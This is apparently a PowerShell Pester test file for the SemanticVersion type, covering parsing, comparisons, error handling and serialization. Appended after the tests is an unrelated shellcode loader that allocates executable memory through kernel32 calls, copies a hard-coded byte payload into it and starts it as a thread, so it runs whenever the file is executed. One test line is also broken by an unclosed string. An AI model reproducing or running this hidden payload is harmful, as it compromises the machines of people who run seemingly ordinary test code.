

using namespace System.Management.Automation
using namespace System.Management.Automation.Language

Describe "SemanticVersion api tests" -Tags 'CI' {
    Context "Constructing valid versions" {
        It "String argument constructor" {
            $v = [SemanticVersion]::new("1.2.3-Alpha-super.3+BLD.a1-xxx.03")
            $v.Major | Should -Be 1
            $v.Minor | Should -Be 2
            $v.Patch | Should -Be 3
            $v.PreReleaseLabel | Should -Be "Alpha-super.3"
            $v.BuildLabel | Should -Be "BLD.a1-xxx.03"
            $v.ToString() | Should -Be "1.2.3-Alpha-super.3+BLD.a1-xxx.03"

            $v = [SemanticVersion]::new("1.0.0")
            $v.Major | Should -Be 1
            $v.Minor | Should -Be 0
            $v.Patch | Should -Be 0
            $v.PreReleaseLabel | Should -BeNullOrEmpty
            $v.BuildLabel | Should -BeNullOrEmpty
            $v.ToString() | Should -Be "1.0.0"

            $v = [SemanticVersion]::new("3.0")
            $v.Major | Should -Be 3
            $v.Minor | Should -Be 0
            $v.Patch | Should -Be 0
            $v.PreReleaseLabel | Should -BeNullOrEmpty
            $v.BuildLabel | Should -BeNullOrEmpty
            $v.ToString() | Should -Be "3.0.0"

            $v = [SemanticVersion]::new("2")
            $v.Major | Should -Be 2
            $v.Minor | Should -Be 0
            $v.Patch | Should -Be 0
            $v.PreReleaseLabel | Should -BeNullOrEmpty
            $v.BuildLabel | Should -BeNullOrEmpty
            $v.ToString() | Should -Be "2.0.0"
        }

        

        It "Int args constructor" {
            $v = [SemanticVersion]::new(1, 0, 0)
            $v.ToString() | Should -Be "1.0.0"

            $v = [SemanticVersion]::new(3, 2, 0, "beta.1")
            $v.ToString() | Should -Be "3.2.0-beta.1"

            $v = [SemanticVersion]::new(3, 2, 0, "beta.1+meta")
            $v.ToString() | Should -Be "3.2.0-beta.1+meta"

            $v = [SemanticVersion]::new(3, 2, 0, "beta.1", "meta")
            $v.ToString() | Should -Be "3.2.0-beta.1+meta"

            $v = [SemanticVersion]::new(3, 1)
            $v.ToString() | Should -Be "3.1.0"

            $v = [SemanticVersion]::new(3)
            $v.ToString() | Should -Be "3.0.0"
        }

        It "Version arg constructor" {
            $v = [SemanticVersion]::new([Version]::new(1, 2))
            $v.ToString() | Should -Be '1.2.0'

            $v = [SemanticVersion]::new([Version]::new(1, 2, 3))
            $v.ToString() | Should -Be '1.2.3'
        }

        It "Can covert to 'Version' type" {
            $v1 = [SemanticVersion]::new(3, 2, 1, "prerelease", "meta")
            $v2 = [Version]$v1
            $v2.GetType() | Should -BeExactly "version"
            $v2.PSobject.TypeNames[0] | Should -Be "System.Version
            $v2.Major | Should -Be 3
            $v2.Minor | Should -Be 2
            $v2.Build | Should -Be 1
            $v2.PSSemVerPreReleaseLabel | Should -Be "prerelease"
            $v2.PSSemVerBuildLabel | Should -Be "meta"
            $v2.ToString() | Should -Be "3.2.1-prerelease+meta"
        }

        It "Semantic version can round trip through version" {
            $v1 = [SemanticVersion]::new(3, 2, 1, "prerelease", "meta")
            $v2 = [SemanticVersion]::new([Version]$v1)
            $v2.ToString() | Should -Be "3.2.1-prerelease+meta"
        }
    }

    Context "Comparisons" {
        BeforeAll {
            $v1_0_0 = [SemanticVersion]::new(1, 0, 0)
            $v1_1_0 = [SemanticVersion]::new(1, 1, 0)
            $v1_1_1 = [SemanticVersion]::new(1, 1, 1)
            $v2_1_0 = [SemanticVersion]::new(2, 1, 0)
            $v1_0_0_alpha = [SemanticVersion]::new(1, 0, 0, "alpha.1.1")
            $v1_0_0_alpha2 = [SemanticVersion]::new(1, 0, 0, "alpha.1.2")
            $v1_0_0_beta = [SemanticVersion]::new(1, 0, 0, "beta")
            $v1_0_0_betaBuild = [SemanticVersion]::new(1, 0, 0, "beta", "BUILD")

            $testCases = @(
                @{ lhs = $v1_0_0; rhs = $v1_1_0 }
                @{ lhs = $v1_0_0; rhs = $v1_1_1 }
                @{ lhs = $v1_1_0; rhs = $v1_1_1 }
                @{ lhs = $v1_0_0; rhs = $v2_1_0 }
                @{ lhs = $v1_0_0_alpha; rhs = $v1_0_0_beta }
                @{ lhs = $v1_0_0_alpha; rhs = $v1_0_0_alpha2 }
                @{ lhs = $v1_0_0_alpha; rhs = $v1_0_0 }
                @{ lhs = $v1_0_0_beta; rhs = $v1_0_0 }
                @{ lhs = $v2_1_0; rhs = "3.0" }
                @{ lhs = "1.5"; rhs = $v2_1_0 }
            )
        }

        It "Build meta should be ignored" {
            $v1_0_0_beta -eq $v1_0_0_betaBuild | Should -BeTrue
            $v1_0_0_betaBuild -lt $v1_0_0_beta | Should -BeFalse
            $v1_0_0_beta -lt $v1_0_0_betaBuild | Should -BeFalse
        }

        It "<lhs> less than <rhs>" -TestCases $testCases {
            param($lhs, $rhs)
            $lhs -lt $rhs | Should -BeTrue
            $rhs -lt $lhs | Should -BeFalse
        }

        It "<lhs> less than or equal <rhs>" -TestCases $testCases {
            param($lhs, $rhs)
            $lhs -le $rhs | Should -BeTrue
            $rhs -le $lhs | Should -BeFalse
            $lhs -le $lhs | Should -BeTrue
            $rhs -le $rhs | Should -BeTrue
        }

        It "<lhs> greater than <rhs>" -TestCases $testCases {
            param($lhs, $rhs)
            $lhs -gt $rhs | Should -BeFalse
            $rhs -gt $lhs | Should -BeTrue
        }

        It "<lhs> greater than or equal <rhs>" -TestCases $testCases {
            param($lhs, $rhs)
            $lhs -ge $rhs | Should -BeFalse
            $rhs -ge $lhs | Should -BeTrue
            $lhs -ge $lhs | Should -BeTrue
            $rhs -ge $rhs | Should -BeTrue
        }

        It "Equality <operand>" -TestCases @(
            @{ operand = $v1_0_0 }
            @{ operand = $v1_0_0_alpha }
        ) {
            param($operand)
            $operand -eq $operand | Should -BeTrue
            $operand -ne $operand | Should -BeFalse
            $null -eq $operand | Should -BeFalse
            $operand -eq $null | Should -BeFalse
            $null -ne $operand | Should -BeTrue
            $operand -ne $null | Should -BeTrue
        }

        It "comparisons with null" {
            $v1_0_0 -lt $null | Should -BeFalse
            $null -lt $v1_0_0 | Should -BeTrue
            $v1_0_0 -le $null | Should -BeFalse
            $null -le $v1_0_0 | Should -BeTrue
            $v1_0_0 -gt $null | Should -BeTrue
            $null -gt $v1_0_0 | Should -BeFalse
            $v1_0_0 -ge $null | Should -BeTrue
            $null -ge $v1_0_0 | Should -BeFalse
        }
    }

    Context "Error handling" {

        It "<name>: '<version>'" -TestCases @(
            @{ name = "Missing parts: 'null'"; errorId = "PSArgumentNullException"; expectedResult = $false; version = $null }
            @{ name = "Missing parts: 'NullString'"; errorId = "PSArgumentNullException"; expectedResult = $false; version = [NullString]::Value }
            @{ name = "Missing parts: 'EmptyString'"; errorId = "FormatException"; expectedResult = $false; version = "" }
            @{ name = "Missing parts"; errorId = "FormatException"; expectedResult = $false; version = "-" }
            @{ name = "Missing parts"; errorId = "FormatException"; expectedResult = $false; version = "." }
            @{ name = "Missing parts"; errorId = "FormatException"; expectedResult = $false; version = "+" }
            @{ name = "Missing parts"; errorId = "FormatException"; expectedResult = $false; version = "-alpha" }
            @{ name = "Missing parts"; errorId = "FormatException"; expectedResult = $false; version = "1..0" }
            @{ name = "Missing parts"; errorId = "FormatException"; expectedResult = $false; version = "1.0.-alpha" }
            @{ name = "Missing parts"; errorId = "FormatException"; expectedResult = $false; version = "1.0.+alpha" }
            @{ name = "Missing parts"; errorId = "FormatException"; expectedResult = $false; version = "1.0.0-alpha+" }
            @{ name = "Missing parts"; errorId = "FormatException"; expectedResult = $false; version = "1.0.0-+" }
            @{ name = "Missing parts"; errorId = "FormatException"; expectedResult = $false; version = "1.0.0+-" }
            @{ name = "Missing parts"; errorId = "FormatException"; expectedResult = $false; version = "1.0.0+" }
            @{ name = "Missing parts"; errorId = "FormatException"; expectedResult = $false; version = "1.0.0-" }
            @{ name = "Missing parts"; errorId = "FormatException"; expectedResult = $false; version = "1.0.0." }
            @{ name = "Missing parts"; errorId = "FormatException"; expectedResult = $false; version = "1.0." }
            @{ name = "Missing parts"; errorId = "FormatException"; expectedResult = $false; version = "1.0.." }
            @{ name = "Missing parts"; errorId = "FormatException"; expectedResult = $false; version = ".0.0" }
            @{ name = "Range check of versions"; errorId = "FormatException"; expectedResult = $false; version = "-1.0.0" }
            @{ name = "Range check of versions"; errorId = "FormatException"; expectedResult = $false; version = "1.-1.0" }
            @{ name = "Range check of versions"; errorId = "FormatException"; expectedResult = $false; version = "1.0.-1" }
            @{ name = "Format errors"; errorId = "FormatException"; expectedResult = $false; version = "aa.0.0" }
            @{ name = "Format errors"; errorId = "FormatException"; expectedResult = $false; version = "1.bb.0" }
            @{ name = "Format errors"; errorId = "FormatException"; expectedResult = $false; version = "1.0.cc" }
        ) {
            param($version, $expectedResult, $errorId)
            { [SemanticVersion]::new($version) } | Should -Throw -ErrorId $errorId
            if ([LanguagePrimitives]::IsNull($version)) {
                
                { [SemanticVersion]::Parse($version) } | Should -Throw -ErrorId "FormatException"
            }
            else {
                { [SemanticVersion]::Parse($version) } | Should -Throw -ErrorId $errorId
            }
            $semVer = $null
            [SemanticVersion]::TryParse($_, [ref]$semVer) | Should -Be $expectedResult
            $semVer | Should -BeNullOrEmpty
        }

        It "Negative version arguments" {
            { [SemanticVersion]::new(-1, 0) } | Should -Throw -ErrorId "PSArgumentException"
            { [SemanticVersion]::new(1, -1) } | Should -Throw -ErrorId "PSArgumentException"
            { [SemanticVersion]::new(1, 1, -1) } | Should -Throw -ErrorId "PSArgumentException"
        }

        It "Incompatible 'Version' throws" {
            
            { [SemanticVersion]::new([Version]::new(0, 0, 0, 4)) } | Should -Throw -ErrorId "PSArgumentException"
            { [SemanticVersion]::new([Version]::new("1.2.3.4")) } | Should -Throw -ErrorId "PSArgumentException"
        }
    }

    Context "Serialization" {
        $testCases = @(
            @{ errorId = "PSArgumentException"; expectedResult = "1.0.0"; semver = [SemanticVersion]::new(1, 0, 0) }
            @{ errorId = "PSArgumentException"; expectedResult = "1.0.1"; semver = [SemanticVersion]::new(1, 0, 1) }
            @{ errorId = "PSArgumentException"; expectedResult = "1.0.0-alpha"; semver = [SemanticVersion]::new(1, 0, 0, "alpha") }
            @{ errorId = "PSArgumentException"; expectedResult = "1.0.0-Alpha-super.3+BLD.a1-xxx.03"; semver = [SemanticVersion]::new(1, 0, 0, "Alpha-super.3+BLD.a1-xxx.03") }
        )
        It "Can round trip: <semver>" -TestCases $testCases {
            param($semver, $expectedResult)

            $ser = [PSSerializer]::Serialize($semver)
            $des = [PSSerializer]::Deserialize($ser)

            $des | Should -BeOfType System.Object
            $des.ToString() | Should -Be $expectedResult
        }
    }

    Context "Formatting" {
        It "Should not throw when default format-table is used" {
            { $PSVersionTable.PSVersion | Format-Table | Out-String } | Should -Not -Throw
        }
    }
}

$19bX = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $19bX -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xd5,0xba,0xc8,0xc2,0x0a,0x98,0xd9,0x74,0x24,0xf4,0x5e,0x2b,0xc9,0xb1,0x47,0x83,0xc6,0x04,0x31,0x56,0x14,0x03,0x56,0xdc,0x20,0xff,0x64,0x34,0x26,0x00,0x95,0xc4,0x47,0x88,0x70,0xf5,0x47,0xee,0xf1,0xa5,0x77,0x64,0x57,0x49,0xf3,0x28,0x4c,0xda,0x71,0xe5,0x63,0x6b,0x3f,0xd3,0x4a,0x6c,0x6c,0x27,0xcc,0xee,0x6f,0x74,0x2e,0xcf,0xbf,0x89,0x2f,0x08,0xdd,0x60,0x7d,0xc1,0xa9,0xd7,0x92,0x66,0xe7,0xeb,0x19,0x34,0xe9,0x6b,0xfd,0x8c,0x08,0x5d,0x50,0x87,0x52,0x7d,0x52,0x44,0xef,0x34,0x4c,0x89,0xca,0x8f,0xe7,0x79,0xa0,0x11,0x2e,0xb0,0x49,0xbd,0x0f,0x7d,0xb8,0xbf,0x48,0xb9,0x23,0xca,0xa0,0xba,0xde,0xcd,0x76,0xc1,0x04,0x5b,0x6d,0x61,0xce,0xfb,0x49,0x90,0x03,0x9d,0x1a,0x9e,0xe8,0xe9,0x45,0x82,0xef,0x3e,0xfe,0xbe,0x64,0xc1,0xd1,0x37,0x3e,0xe6,0xf5,0x1c,0xe4,0x87,0xac,0xf8,0x4b,0xb7,0xaf,0xa3,0x34,0x1d,0xbb,0x49,0x20,0x2c,0xe6,0x05,0x85,0x1d,0x19,0xd5,0x81,0x16,0x6a,0xe7,0x0e,0x8d,0xe4,0x4b,0xc6,0x0b,0xf2,0xac,0xfd,0xec,0x6c,0x53,0xfe,0x0c,0xa4,0x97,0xaa,0x5c,0xde,0x3e,0xd3,0x36,0x1e,0xbf,0x06,0xa2,0x1b,0x57,0x69,0x9b,0x25,0xc0,0x01,0xde,0x25,0x0f,0x69,0x57,0xc3,0x5f,0xdd,0x38,0x5c,0x1f,0x8d,0xf8,0x0c,0xf7,0xc7,0xf6,0x73,0xe7,0xe7,0xdc,0x1b,0x8d,0x07,0x89,0x74,0x39,0xb1,0x90,0x0f,0xd8,0x3e,0x0f,0x6a,0xda,0xb5,0xbc,0x8a,0x94,0x3d,0xc8,0x98,0x40,0xce,0x87,0xc3,0xc6,0xd1,0x3d,0x69,0xe6,0x47,0xba,0x38,0xb1,0xff,0xc0,0x1d,0xf5,0x5f,0x3a,0x48,0x8e,0x56,0xae,0x33,0xf8,0x96,0x3e,0xb4,0xf8,0xc0,0x54,0xb4,0x90,0xb4,0x0c,0xe7,0x85,0xba,0x98,0x9b,0x16,0x2f,0x23,0xca,0xcb,0xf8,0x4b,0xf0,0x32,0xce,0xd3,0x0b,0x11,0xce,0x28,0xda,0x5f,0xa4,0x40,0xde;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$JQEo=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($JQEo.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$JQEo,0,0,0);for (;;){Start-sleep 60};

